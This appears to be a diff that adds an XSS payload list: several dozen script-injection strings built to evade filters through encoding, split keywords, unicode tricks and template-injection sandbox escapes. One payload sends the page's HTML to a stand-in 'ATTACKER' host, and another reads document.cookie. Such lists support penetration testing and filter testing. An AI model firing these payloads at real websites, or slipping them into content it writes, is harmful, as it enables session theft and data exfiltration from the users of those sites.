@@ -1,0 +1,48 @@
+<object/data=javascript:alert()>
+<a/href="javascript%0A%0D:alert()">
+<svg onpointerenter=z=alert,z(document.domain)>
+<button formation=javascript:z=top;x=document;y=x.domain; z[/al/.source+/ert/.source](y)>XSS</button>
+>>
+
+'\"><a href=\"&#74;avascript&#x3a;self['\\x61\\x6c\\x65\\x72\\x74']('\\x58\\x53\\x53' )\">test</a
+
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\u0022a\u0022,\u0022alert(1)\u0022].sort(toString.constructor);}}
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}}
+
+<script>/&/-alert(1)</script>
+<script>/&/-alert(1)</script>
+
+%00%00%00%00%00%00%00<script>alert(1)</script>
+
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
+
+<script>alert.call(null,1)</script> (alert.call(%20, "XSS");)
+
+<script>confirm.call(null,1)</script>
+
+<script>prompt.call(null,1)</script>
+
+<script>alert.apply(null, [1])</script>
+
+
+<img src=x onerror=alert(new Image().src='http://ATTACKER/any?output='+document.body.innerHTML>
+
+<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div">
+
+'"><>--!><--example'"><>--!><-->>>>>!--><img src=v onerror=alert(2)>{{7 *7}}{{constructor.constructor('alert(document.cookie)')()}}javascript:alert(12)
+
+<!-- Bitwise operand before equal sign - URL encoded -->
+
+<svg%20onload%0a||||=%27z=top%09;%0atop[/pro/.source+/mpt/.source]%28document.domain%29%20%27<li
+
+<!-- unicode normalization payload -->
+
+\u0022\u226F\u226Eimg src\u003dx onerror\u003dalert()\u226F
+
+<!-- triple url encode -->
+
+%252522+onmouseover=alert(1)+x=%252522s
+
+<!-- XSS inside tynemce -->
+
+<TABLE><TD><DIV><iframe/<META HTTP-EQUIV='refresh' CONTENT='0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgncmFmYWVsJyk8L3NjcmlwdD4K'>
